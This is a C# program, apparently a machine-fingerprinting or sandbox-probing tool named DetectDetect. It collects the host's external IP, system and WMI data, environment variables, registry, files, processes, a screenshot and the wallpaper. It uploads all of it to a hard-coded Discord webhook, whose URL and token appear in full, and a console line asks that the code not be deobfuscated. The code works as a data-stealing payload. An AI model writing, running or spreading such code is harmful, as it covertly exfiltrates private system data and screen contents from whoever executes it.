using DetectDetect.WMICore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using System.Net;
using DetectDetect.Utils;

using DetectDetect.Native;
using System.Runtime.InteropServices;
using DetectDetect.Info;

namespace DetectDetect
{
    internal class Program {
        public static string TAG = "Test";
        public static string WEBHOOK = "https://discord.com/api/webhooks/1244139191567126578/KwDFQoCzDOjJB9O-H6YL-K4rUrFR6vIwVxp6erOHJLvPpzNIV8U8DMTtycBL1rPW1nIj";
        public static string SESSION_ID = Guid.NewGuid().ToString();

        static void Main(string[] args) {
            //Console.WriteLine(NetCard.GetExternalIPAddress());
            DiscordWebhook hook = new DiscordWebhook(WEBHOOK, TAG, SESSION_ID);
            _ = hook.SendMessageAsync($"{StrUtils.CharMultiply('=', 88)}\nNew Machine! GUID[{hook.GetID()}] IP[{NetCard.GetExternalIPAddress()}]\n{StrUtils.CharMultiply('=', 88)}");
            Console.WriteLine("Doing Stuff please do not deob-fuscate the Code");
            var writer = new ReportWriter()
                .WriteBasicInfo()
                .WriteSystemInfoCommand()
                .WriteEnvironmentVariables()
                .WriteWmiTests()
                .WriteSystemInformationClass()
                .WriteNetCards()
                .WriteRegReport()
                .WriteFilesReport()
                .WriteProcesses()
                .WriteReportsWmi();

            Console.WriteLine("Going to send...");
            _ = hook.UploadBytesFileAsync(Encoding.UTF8.GetBytes(writer.ToString()), $"Test Result V2! GUID[{hook.GetID()}]", "Test-Results.txt");

            Console.WriteLine("Sending Rest of Tech...");
            var bys = WallpaperUtils.CaptureScreenshot();
            if(bys != null) _ = hook.UploadBytesImageAsync(bys, $"Screenshot! GUID({hook.GetID()})", "Screenshot.png");
            try {
                _ = hook.SendImageAsync(WallpaperUtils.GetWallpaper(), $"Wallaper! GUID[{hook.GetID()}]");
                string byHex = StrUtils.BytesToHexString(File.ReadAllBytes(WallpaperUtils.GetWallpaper()));
                _ = hook.UploadBytesFileAsync(Encoding.UTF8.GetBytes(byHex), "Wallpaper Bytes Hex String!", "Wallpaper-bytes.txt");
            } catch { }

            Console.WriteLine("ByeBye");
            MessageBox.Show("ByeBye!");
            Win32.USER32.Invoke<int>("MessageBox", 0, "Hey", "There", 0);
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
        }
    }
}

